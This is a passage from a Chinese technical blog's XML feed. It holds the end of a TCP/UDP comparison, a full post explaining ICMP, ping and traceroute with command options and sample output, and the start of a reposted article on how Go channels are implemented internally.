应该根据应用的目的按需使用。</p><p>例如，当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如<strong>HTTP、HTTPS、FTP</strong>等传输文件的协议选择使用<strong>TCP</strong>协议，<strong>POP、SMTP</strong>等邮件传输的协议。当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用<strong>UDP</strong>（如视频传输、实时通信等）。</p><p><img src="https://s6.51cto.com/oss/202105/14/26c5f19079fba62b5682f613b94c8df3.jpg" alt="img"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://time.geekbang.org/column/article/8924">https://time.geekbang.org/column/article/8924</a></p><p>2.<a href="https://www.51cto.com/article/662343.html">https://www.51cto.com/article/662343.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于ICMP与ping：计算机网络中的侦察兵</title>
    <link href="/2023/01/02/%E5%85%B3%E4%BA%8EICMP%E4%B8%8Eping%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E4%BE%A6%E5%AF%9F%E5%85%B5/"/>
    <url>/2023/01/02/%E5%85%B3%E4%BA%8EICMP%E4%B8%8Eping%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E4%BE%A6%E5%AF%9F%E5%85%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="关于ICMP与ping：计算机网络中的侦察兵"><a href="#关于ICMP与ping：计算机网络中的侦察兵" class="headerlink" title="关于ICMP与ping：计算机网络中的侦察兵"></a>关于ICMP与ping：计算机网络中的侦察兵</h1><blockquote><p>本文章主要内容引用自：1.刘超，<a href="https://time.geekbang.org/column/article/8445">趣谈网络协议</a>  2.<a href="https://einverne.github.io/post/2017/06/traceroute.html">每天学习一个命令：traceroute 查看路由信息</a></p></blockquote><h2 id="ICMP协议的格式"><a href="#ICMP协议的格式" class="headerlink" title="ICMP协议的格式"></a>ICMP协议的格式</h2><p>在日常工作生活中，大家经常会遇到网络不通的情况，面对这种情况，我们首先会想到ping一下。那ping是如何工作的呢？</p><p>ping是基于ICMP协议工作的。 <strong>ICMP</strong> 全称 <strong>Internet Control Message Protocol</strong>，就是 <strong>互联网控制报文协议</strong>。这里面的关键词是“控制”，那具体是怎么控制的呢？</p><p>网络包在异常复杂的网络环境中传输时，常常会遇到各种各样的问题。当遇到问题的时候，总不能“死个不明不白”，要传出消息来，报告情况，这样才可以调整传输策略。这就相当于我们经常看到的电视剧里，古代行军的时候，为将为帅者需要通过侦察兵、哨探或传令兵等人肉的方式来掌握情况，控制整个战局。</p><p>ICMP报文是封装在IP包里面的。因为传输指令的时候，肯定需要源地址和目标地址。它本身非常简单。因为作为侦查兵，要轻装上阵，不能携带大量的包袱。</p><p><img src="https://static001.geekbang.org/resource/image/20/e2/201589bb205c5b00ad42e0081aa46fe2.jpg?wh=3043*1243" alt="img"></p><p>ICMP报文有很多的类型，不同的类型有不同的代码。 <strong>最常用的类型是主动请求为8，主动请求的应答为0</strong>。</p><h2 id="查询报文类型"><a href="#查询报文类型" class="headerlink" title="查询报文类型"></a>查询报文类型</h2><p>我们经常在电视剧里听到这样的话：主帅说，来人哪！前方战事如何，快去派人打探，一有情况，立即通报！</p><p>这种是主帅发起的，主动查看敌情，对应ICMP的 <strong>查询报文类型</strong>。例如，常用的 <strong>ping就是查询报文，是一种主动请求，并且获得主动应答的ICMP协议。</strong> 所以，ping发的包也是符合ICMP协议格式的，只不过它在后面增加了自己的格式。</p><p>对ping的主动请求，进行网络抓包，称为 <strong>ICMP ECHO REQUEST。同理主动请求的回复，称为ICMP ECHO REPLY</strong>。比起原生的ICMP，这里面多了两个字段，一个是 <strong>标识符</strong>。这个很好理解，你派出去两队侦查兵，一队是侦查战况的，一队是去查找水源的，要有个标识才能区分。另一个是 <strong>序号</strong>，你派出去的侦查兵，都要编个号。如果派出去10个，回来10个，就说明前方战况不错；如果派出去10个，回来2个，说明情况可能不妙。</p><p>在选项数据中，ping还会存放发送请求的时间值，来计算往返时间，说明路程的长短。</p><h2 id="差错报文类型"><a href="#差错报文类型" class="headerlink" title="差错报文类型"></a>差错报文类型</h2><p>当然也有另外一种方式，就是差错报文。</p><p>主帅骑马走着走着，突然来了一匹快马，上面的小兵气喘吁吁的：报告主公，不好啦！张将军遭遇埋伏，全军覆没啦！这种是异常情况发起的，来报告发生了不好的事情，对应ICMP的 <strong>差错报文类型</strong>。</p><p>我举几个ICMP差错报文的例子： <strong>终点不可达为3，源抑制为4，超时为11，重定向为5</strong>。这些都是什么意思呢？我给你具体解释一下。</p><p><strong>第一种是终点不可达</strong>。小兵：报告主公，您让把粮草送到张将军那里，结果没有送到。</p><p>如果你是主公，你肯定会问，为啥送不到？具体的原因在代码中表示就是，网络不可达代码为0，主机不可达代码为1，协议不可达代码为2，端口不可达代码为3，需要进行分片但设置了不分片位代码为4。</p><p>具体的场景就像这样：</p><ul><li>网络不可达：主公，找不到地方呀？</li><li>主机不可达：主公，找到地方没这个人呀？</li><li>协议不可达：主公，找到地方，找到人，口号没对上，人家天王盖地虎，我说12345！</li><li>端口不可达：主公，找到地方，找到人，对了口号，事儿没对上，我去送粮草，人家说他们在等救兵。</li><li>需要进行分片但设置了不分片位：主公，走到一半，山路狭窄，想换小车，但是您的将令，严禁换小车，就没办法送到了。</li></ul><p><strong>第二种是源站抑制</strong>，也就是让源站放慢发送速度。小兵：报告主公，您粮草送的太多了吃不完。</p><p><strong>第三种是时间超时</strong>，也就是超过网络包的生存时间还是没到。小兵：报告主公，送粮草的人，自己把粮草吃完了，还没找到地方，已经饿死啦。</p><p><strong>第四种是路由重定向</strong>，也就是让下次发给另一个路由器。小兵：报告主公，上次送粮草的人本来只要走一站地铁，非得从五环绕，下次别这样了啊。</p><p>差错报文的结构相对复杂一些。除了前面还是IP，ICMP的前8字节不变，后面则跟上出错的那个IP包的IP头和IP正文的前8个字节。</p><p>而且这类侦查兵特别恪尽职守，不但自己返回来报信，还把一部分遗物也带回来。</p><ul><li>侦察兵：报告主公，张将军已经战死沙场，这是张将军的印信和佩剑。</li><li>主公：神马？张将军是怎么死的（可以查看ICMP的前8字节）？没错，这是张将军的剑，是他的剑（IP数据包的头及正文前8字节）。</li></ul><h2 id="ping：查询报文类型的使用"><a href="#ping：查询报文类型的使用" class="headerlink" title="ping：查询报文类型的使用"></a>ping：查询报文类型的使用</h2><p>接下来，我们重点来看ping的发送和接收过程。</p><p><img src="https://static001.geekbang.org/resource/image/57/21/57a77fb89bc4a5653842276c70c0d621.jpg?wh=4463*2786" alt="img"></p><p>假定主机A的IP地址是192.168.1.1，主机B的IP地址是192.168.1.2，它们都在同一个子网。那当你在主机A上运行“ping 192.168.1.2”后，会发生什么呢?</p><p>ping命令执行的时候，源主机首先会构建一个ICMP请求数据包，ICMP数据包内包含多个字段。最重要的是两个，第一个是 <strong>类型字段</strong>，对于请求数据包而言该字段为 8；另外一个是 <strong>顺序号</strong>，主要用于区分连续ping的时候发出的多个数据包。每发出一个请求数据包，顺序号会自动加1。为了能够计算往返时间RTT，它会在报文的数据部分插入发送时间。</p><p>然后，由ICMP协议将这个数据包连同地址192.168.1.2一起交给IP层。IP层将以192.168.1.2作为目的地址，本机IP地址作为源地址，加上一些其他控制信息，构建一个IP数据包。</p><p>接下来，需要加入MAC头。如果在本节ARP映射表中查找出IP地址192.168.1.2所对应的MAC地址，则可以直接使用；如果没有，则需要发送ARP协议查询MAC地址，获得MAC地址后，由数据链路层构建一个数据帧，目的地址是IP层传过来的MAC地址，源地址则是本机的MAC地址；还要附加上一些控制信息，依据以太网的介质访问规则，将它们传送出去。</p><p>主机B收到这个数据帧后，先检查它的目的MAC地址，并和本机的MAC地址对比，如符合，则接收，否则就丢弃。接收后检查该数据帧，将IP数据包从帧中提取出来，交给本机的IP层。同样，IP层检查后，将有用的信息提取后交给ICMP协议。</p><p>主机B会构建一个 ICMP 应答包，应答数据包的类型字段为 0，顺序号为接收到的请求数据包中的顺序号，然后再发送出去给主机A。</p><p>在规定的时候间内，源主机如果没有接到 ICMP 的应答包，则说明目标主机不可达；如果接收到了 ICMP 应答包，则说明目标主机可达。此时，源主机会检查，用当前时刻减去该数据包最初从源主机上发出的时刻，就是 ICMP 数据包的时间延迟。</p><p>当然这只是最简单的，同一个局域网里面的情况。如果跨网段的话，还会涉及网关的转发、路由器的转发等等。但是对于ICMP的头来讲，是没什么影响的。会影响的是根据目标IP地址，选择路由的下一跳，还有每经过一个路由器到达一个新的局域网，需要换MAC头里面的MAC地址。</p><p>如果在自己的可控范围之内，当遇到网络不通的问题的时候，除了直接ping目标的IP地址之外，还应该有一个清晰的网络拓扑图。并且从理论上来讲，应该要清楚地知道一个网络包从源地址到目标地址都需要经过哪些设备，然后逐个ping中间的这些设备或者机器。如果可能的话，在这些关键点，通过tcpdump -i eth0 icmp，查看包有没有到达某个点，回复的包到达了哪个点，可以更加容易推断出错的位置。</p><p>经常会遇到一个问题，如果不在我们的控制范围内，很多中间设备都是禁止ping的，但是ping不通不代表网络不通。这个时候就要使用telnet，通过其他协议来测试网络是否通。</p><h2 id="Traceroute：差错报文类型的使用"><a href="#Traceroute：差错报文类型的使用" class="headerlink" title="Traceroute：差错报文类型的使用"></a>Traceroute：差错报文类型的使用</h2><p>traceroute（跟踪路由）是<strong>路由跟踪程序，用于确定 IP 数据报访问目标所经过的路径。traceroute 命令用 IP 存活时间 (TTL) 字段和 ICMP 错误消息来确定从一个主机到网络上其他主机的路由。</strong></p><p>通过 traceroute 命令可以知道数据包从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地 (destination) 走的路径可能会不一样，但大部分时候所走的路由是相同的。</p><p>Linux 系统中是 traceroute, 在 Windows 中为 tracert。traceroute 通过发送小数据包到目的主机直到其返回，来测量其耗时。一条路径上的每个设备 traceroute 要测 3 次。输出结果中包括每次测试的时间 (ms) 和设备的名称及其 IP 地址。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>命令格式：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">traceroute options host</span><br></code></pre></td></tr></table></figure><p>命令功能：</p><p>traceroute 预设数据包大小是 40Bytes，可设置。</p><p>具体参数格式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">traceroute <span class="hljs-selector-attr">[-dFlnrvx]</span><span class="hljs-selector-attr">[-f 存活数值]</span><span class="hljs-selector-attr">[-g 网关...]</span><span class="hljs-selector-attr">[-i 网络界面]</span><span class="hljs-selector-attr">[-m 存活数值]</span><span class="hljs-selector-attr">[-p 通信端口]</span><span class="hljs-selector-attr">[-s 来源地址]</span><span class="hljs-selector-attr">[-t 服务类型]</span><span class="hljs-selector-attr">[-w 超时秒数]</span><span class="hljs-selector-attr">[主机名称或 IP 地址]</span> 数据包大小<br></code></pre></td></tr></table></figure><p>命令参数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-d 使用 Socket 层级的排错功能。</span><br><span class="hljs-deletion">-f 设置第一个检测数据包的存活数值 TTL 的大小。</span><br><span class="hljs-deletion">-F 设置勿离断位。</span><br><span class="hljs-deletion">-g 设置来源路由网关，最多可设置 8 个。</span><br><span class="hljs-deletion">-i 使用指定的网络界面送出数据包。</span><br><span class="hljs-deletion">-I 使用 ICMP 回应取代 UDP 资料信息。</span><br><span class="hljs-deletion">-m 设置检测数据包的最大存活数值 TTL 的大小。</span><br><span class="hljs-deletion">-n 直接使用 IP 地址而非主机名称。</span><br><span class="hljs-deletion">-p 设置 UDP 传输协议的通信端口。</span><br><span class="hljs-deletion">-r 忽略普通的 Routing Table，直接将数据包送到远端主机上。</span><br><span class="hljs-deletion">-s 设置本地主机送出数据包的 IP 地址。</span><br><span class="hljs-deletion">-t 设置检测数据包的 TOS 数值。</span><br><span class="hljs-deletion">-v 详细显示指令的执行过程。</span><br><span class="hljs-deletion">-w 设置等待远端主机回报的时间。</span><br><span class="hljs-deletion">-x 开启或关闭数据包的正确性检验。</span><br></code></pre></td></tr></table></figure><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>traceroute 命令利用 ICMP 及 IP header 的 TTL(Time To Live) 字段 (field)。</p><ul><li>traceroute 送出一个 TTL 是 1 的 IP datagram 到目的地（每次送出的为 3 个 40 字节的包，包括源地址，目的地址和包发出的时间），当路径上的第一个路由器 (router) 收到这个 datagram 时，它将 TTL 减 1。此时，TTL 变为 0 了，所以该路由器会将此 datagram 丢掉，并送回一个「ICMP time exceeded」消息（包括发 IP 包的源地址，IP 包的所有内容及路由器的 IP 地址），traceroute 收到这个消息后，便知道这个路由器存在于这个路径上</li><li>接着 traceroute 再送出另一个 TTL 是 2 的 datagram，发现第 2 个路由器</li><li>……</li><li>traceroute 每次将送出的 datagram 的 TTL 加 1 来发现另一个路由器，这个重复的动作一直持续到某个 datagram 抵达目的地。当 datagram 到达目的地后，该主机并不会送回 ICMP time exceeded 消息，因为它已是目的地了。</li><li>traceroute 如何得知目的地到达了呢？traceroute 在送出 UDP datagrams 到目的地时，它所选择送达的 port number 是一个一般应用程序都不会用的端口 (30000 以上），所以当此 UDP datagram 到达目的地后该主机会回送一个 (ICMP port unreachable) 的消息，而当 traceroute 收到这个消息时，便知道目的地已经到达了。所以 traceroute 在 Server 端也是没有所谓的 Daemon 程式。</li></ul><p>traceroute 提取发 ICMP TTL 到期消息设备的 IP 地址并作域名解析。每次 traceroute 都打印出一系列数据，包括所经过的路由设备的域名及 IP 地址，三个包每次来回所花时间。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="最常用法"><a href="#最常用法" class="headerlink" title="最常用法"></a>最常用法</h4><p>直接追踪路由</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">traceroute ip_or_host</span><br></code></pre></td></tr></table></figure><p>结果说明：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">traceroute</span> to <span class="hljs-number">180.149.128.9</span> (<span class="hljs-number">180.149.128.9</span>), <span class="hljs-number">30</span> hops max, <span class="hljs-number">32</span> byte packets<br> <span class="hljs-attribute">1</span>  <span class="hljs-number">209.17.118.3</span>  <span class="hljs-number">0</span>.<span class="hljs-number">30</span> ms  AS59253  Singapore, greenserver.io<br> <span class="hljs-attribute">2</span>  <span class="hljs-number">23.106.255.6</span>  <span class="hljs-number">0</span>.<span class="hljs-number">68</span> ms  AS59253  Singapore, leaseweb.com<br> <span class="hljs-attribute">3</span>  <span class="hljs-number">23.106.255.198</span>  <span class="hljs-number">1</span>.<span class="hljs-number">38</span> ms  AS59253  Singapore, leaseweb.com<br> <span class="hljs-attribute">4</span>  <span class="hljs-number">204.130.243.4</span>  <span class="hljs-number">1</span>.<span class="hljs-number">26</span> ms  *  United States<br> <span class="hljs-attribute">5</span>  <span class="hljs-number">154.54.45.193</span>  <span class="hljs-number">178</span>.<span class="hljs-number">34</span> ms  AS174  United States, California, Los Angeles, cogentco.com<br> <span class="hljs-attribute">6</span>  <span class="hljs-number">38.142.238.34</span>  <span class="hljs-number">179</span>.<span class="hljs-number">28</span> ms  AS174  United States, California, Los Angeles, cogentco.com<br> <span class="hljs-attribute">7</span>  <span class="hljs-number">202.97.59.141</span>  <span class="hljs-number">334</span>.<span class="hljs-number">31</span> ms  AS4134  China, Beijing, ChinaTelecom<br> <span class="hljs-attribute">8</span>  <span class="hljs-number">202.97.12.117</span>  <span class="hljs-number">328</span>.<span class="hljs-number">51</span> ms  AS4134  China, Beijing, ChinaTelecom<br> <span class="hljs-attribute">9</span>  *<br><span class="hljs-attribute">10</span>  *<br><span class="hljs-attribute">11</span>  *<br><span class="hljs-attribute">12</span>  <span class="hljs-number">180.149.128.9</span>  <span class="hljs-number">342</span>.<span class="hljs-number">12</span> ms  AS23724  China, Beijing, ChinaTelecom<br></code></pre></td></tr></table></figure><p>序列号从 1 开始，每条纪录就是一跳，每一跳表示一个网关，每行有三个时间，单位都是 ms，其实就是 <code>-q</code> 的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果您用 <code>traceroute -q 10 google.com</code> ，表示向每个网关发送 10 个数据包。</p><p>traceroute 一台主机有时会看到一些行以星号表示，出现这样的情况，可能是防火墙封掉了 ICMP 的返回信息，得不到什么相关的数据包返回数据。</p><p>有时在某一网关处延时比较长，可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台 DNS 出现问题时，不能解析主机名、域名时，也会有延时长的现象；您可以加 <code>-n</code> 参数来避免 DNS 解析，以 IP 输出数据。</p><p>如果在局域网中的不同网段之间，可以通过 traceroute 来排查问题所在，是主机的问题还是网关的问题。如果通过远程来访问某台服务器遇到问题时，用到 traceroute 追踪数据包所经过的网关，提交 IDC 服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，即使发现问题，IDC 服务商也不可能帮助解决。</p><h4 id="跳数设置"><a href="#跳数设置" class="headerlink" title="跳数设置"></a>跳数设置</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">traceroute</span> -m <span class="hljs-number">10</span> google.com<br></code></pre></td></tr></table></figure><h4 id="不解析主机名"><a href="#不解析主机名" class="headerlink" title="不解析主机名"></a>不解析主机名</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">traceroute -<span class="hljs-built_in">n</span> google.com<br></code></pre></td></tr></table></figure><h4 id="设置探测包数量"><a href="#设置探测包数量" class="headerlink" title="设置探测包数量"></a>设置探测包数量</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">traceroute</span> -q <span class="hljs-number">4</span> google.com<br></code></pre></td></tr></table></figure><h4 id="绕过正常的路由表直接发送到网络相连的主机"><a href="#绕过正常的路由表直接发送到网络相连的主机" class="headerlink" title="绕过正常的路由表直接发送到网络相连的主机"></a>绕过正常的路由表直接发送到网络相连的主机</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">traceroute</span> -r douban.com<br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>ICMP相当于网络世界的侦察兵。我讲了两种类型的ICMP报文，一种是主动探查的查询报文，一种异常报告的差错报文；</li><li>ping使用查询报文，Traceroute使用差错报文。</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang 中channel的底层实现</title>
    <link href="/2023/01/01/Golang%E7%9A%84channel%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/01/01/Golang%E7%9A%84channel%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang-的channel底层实现"><a href="#Golang-的channel底层实现" class="headerlink" title="Golang 的channel底层实现"></a>Golang 的channel底层实现</h1><blockquote><p>转载自RyuGou的<a href="https://i6448038.github.io/2019/04/11/go-channel/">图解Go的channel底层实现</a></p></blockquote><h2 id="channel的整体结构图"><a href="#channel的整体结构图" class="headerlink" title="channel的整体结构图"></a>channel的整体结构图</h2><p><img src="https://i6448038.github.io/img/channel/hchan.png" alt="img"></p><p>简单说明：</p><ul><li><code>buf</code>是有缓冲的channel所特有的结构，用来存储缓存数据。是个循环链表</li><li><code>sendx</code>和<code>recvx</code>用于记录<code>buf</code>这个循环链表中的发送或者接收的index</li><li><code>lock</code>是个互斥锁。</li><li><code>recvq</code>和<code>sendq</code>分别是接收(&lt;-channel)或者发送(channel &lt;- xxx)的goroutine抽象出来的结构体(sudog)的队列。是个双向链表</li></ul><p>源码位于<code>/runtime/chan.go</code>中(目前版本：1.11)。结构体为<code>hchan</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> hchan <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// chan 里元素数量</span><br>qcount   <span class="hljs-type">uint</span><br><span class="hljs-comment">// chan 底层循环数组的长度</span><br>dataqsiz <span class="hljs-type">uint</span><br><span class="hljs-comment">// 指向底层循环数组的指针</span><br><span class="hljs-comment">// 只针对有缓冲的 channel</span><br>buf      unsafe.Pointer<br><span class="hljs-comment">// chan 中元素大小</span><br>elemsize <span class="hljs-type">uint16</span><br><span class="hljs-comment">// chan 是否被关闭的标志</span><br>closed   <span class="hljs-type">uint32</span><br><span class="hljs-comment">// chan 中元素类型</span><br>elemtype *_type <span class="hljs-comment">// element type</span><br><span class="hljs-comment">// 已发送元素在循环数组中的索引</span><br>sendx    <span class="hljs-type">uint</span>   <span class="hljs-comment">// send index</span><br><span class="hljs-comment">// 已接收元素在循环数组中的索引</span><br>recvx    <span class="hljs-type">uint</span>   <span class="hljs-comment">// receive index</span><br><span class="hljs-comment">// 等待接收的 goroutine 队列</span><br>recvq    waitq  <span class="hljs-comment">// list of recv waiters</span><br><span class="hljs-comment">// 等待发送的 goroutine 队列</span><br>sendq    waitq  <span class="hljs-comment">// list of send waiters</span><br><br><span class="hljs-comment">// 保护 hchan 中所有字段</span><br>    <span class="hljs-comment">// lock protects all fields in hchan, as well as several</span><br>    <span class="hljs-comment">// fields in sudogs blocked on this channel.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Do not change another G&#x27;s status while holding this lock</span><br>    <span class="hljs-comment">// (in particular, do not ready a G), as this can deadlock</span><br>    <span class="hljs-comment">// with stack shrinking.</span><br>    lock mutex<br>&#125;<br></code></pre></td></tr></table></figure><p>下面我们来详细介绍<code>hchan</code>中各部分是如何使用的。</p><h2 id="先从创建开始"><a href="#先从创建开始" class="headerlink" title="先从创建开始"></a>先从创建开始</h2><p>我们首先创建一个channel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i6448038.github.io/img/channel/hchan1.png" alt="img"></p><p>创建channel实际上就是在内存中实例化了一个<code>hchan</code>的结构体，并返回一个ch指针，我们使用过程中channel在函数之间的传递都是用的这个指针，这就是为什么函数传递中无需使用channel的指针，而直接用channel就行了，因为channel本身就是一个指针。</p><h2 id="channel中发送send-ch-lt-xxx-和recv-lt-ch-接收"><a href="#channel中发送send-ch-lt-xxx-和recv-lt-ch-接收" class="headerlink" title="channel中发送send(ch &lt;- xxx)和recv(&lt;- ch)接收"></a>channel中发送send(ch &lt;- xxx)和recv(&lt;- ch)接收</h2><p>先考虑一个问题，如果你想让goroutine以先进先出(FIFO)的方式进入一个结构体中，你会怎么操作？<br>加锁！对的！channel就是用了一个锁。hchan本身包含一个互斥锁<code>mutex</code></p><h3 id="channel中队列是如何实现的"><a href="#channel中队列是如何实现的" class="headerlink" title="channel中队列是如何实现的"></a>channel中队列是如何实现的</h3><p>channel中有个缓存buf，是用来缓存数据的(假如实例化了带缓存的channel的话)队列。我们先来看看是如何实现“队列”的。<br>还是刚才创建的那个channel</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i6448038.github.io/img/channel/hchan_gif1.png" alt="img"></p><p>当使用<code>send (ch &lt;- xx)</code>或者<code>recv ( &lt;-ch)</code>的时候，首先要锁住<code>hchan</code>这个结构体。</p><p><img src="https://i6448038.github.io/img/channel/hchan_gif2.png" alt="img"></p><p>然后开始<code>send (ch &lt;- xx)</code>数据。<br>一</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ch</span> &lt;- <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>二</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ch</span> &lt;- <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>三</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ch</span> &lt;- <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这时候满了，队列塞不进去了<br>动态图表示为：<br><img src="https://i6448038.github.io/img/channel/send.gif" alt="img"></p><p>然后是取<code>recv ( &lt;-ch)</code>的过程，是个逆向的操作，也是需要加锁。</p><p><img src="https://i6448038.github.io/img/channel/hchan_gif6.png" alt="img"></p><p>然后开始<code>recv (&lt;-ch)</code>数据。<br>一</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;-ch<br></code></pre></td></tr></table></figure><p>二</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;-ch<br></code></pre></td></tr></table></figure><p>三</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;-ch<br></code></pre></td></tr></table></figure><p>图为：<br><img src="https://i6448038.github.io/img/channel/recv.gif" alt="img"></p><p>注意以上两幅图中<code>buf</code>和<code>recvx</code>以及<code>sendx</code>的变化，<code>recvx</code>和<code>sendx</code>是根据循环链表<code>buf</code>的变动而改变的。<br>至于为什么channel会使用循环链表作为缓存结构，我个人认为是在缓存列表在动态的<code>send</code>和<code>recv</code>过程中，定位当前<code>send</code>或者<code>recvx</code>的位置、选择<code>send</code>的和<code>recvx</code>的位置比较方便吧，只要顺着链表顺序一直旋转操作就好。</p><p>缓存中按链表顺序存放，取数据的时候按链表顺序读取，符合FIFO的原则。</p><h3 id="send-x2F-recv的具体操作"><a href="#send-x2F-recv的具体操作" class="headerlink" title="send&#x2F;recv的具体操作"></a>send&#x2F;recv的具体操作</h3><p>注意：缓存链表中以上每一步的操作，都是需要加锁操作的！</p><p>每一步的操作的细节可以细化为：</p><ul><li>第一，加锁</li><li>第二，把数据从goroutine中copy到“队列”中(或者从队列中copy到goroutine中）。</li><li>第三，释放锁</li></ul><p>每一步的操作总结为动态图为：(发送过程)<br><img src="https://i6448038.github.io/img/channel/send_single.gif" alt="img"></p><p>或者为：(接收过程)<br><img src="https://i6448038.github.io/img/channel/recv_single.gif" alt="img"></p><p>所以不难看出，Go中那句经典的话：<code>Do not communicate by sharing memory; instead, share memory by communicating.</code>的具体实现就是利用channel把数据从一端copy到了另一端！<br>还真是符合<code>channel</code>的英文含义：</p><p><img src="https://i6448038.github.io/img/channel/hchan_channl.gif" alt="img"></p><h3 id="当channel缓存满了之后会发生什么？这其中的原理是怎样的？"><a href="#当channel缓存满了之后会发生什么？这其中的原理是怎样的？" class="headerlink" title="当channel缓存满了之后会发生什么？这其中的原理是怎样的？"></a>当channel缓存满了之后会发生什么？这其中的原理是怎样的？</h3><p>使用的时候，我们都知道，当channel缓存满了，或者没有缓存的时候，我们继续send(ch &lt;- xxx)或者recv(&lt;- 